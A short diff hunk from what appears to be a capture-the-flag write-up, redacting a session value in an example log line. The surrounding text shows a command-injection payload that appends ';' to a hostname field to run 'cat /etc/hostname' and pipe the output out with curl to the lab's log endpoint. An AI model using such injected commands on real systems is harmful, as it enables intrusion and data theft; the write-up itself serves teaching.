@@ -33,7 +33,7 @@ Browsing `/level/9/logs` reveals it records every HTTP request as JSON, but keep
 ```bash
 google.com; cat /etc/hostname | curl -G --data-urlencode x@- http://localhost/level/9/logs
 # -> Online
-# log: {"path":"/level/9/logs","query":"x=ctf-session-9d446f1f975f%0a"}
+# log: {"path":"/level/9/logs","query":"x=ctf-session-REDACTED%0a"}
 ```
 
 The container hostname arrived in the logs — the channel works, even though the UI only ever said `Online`.
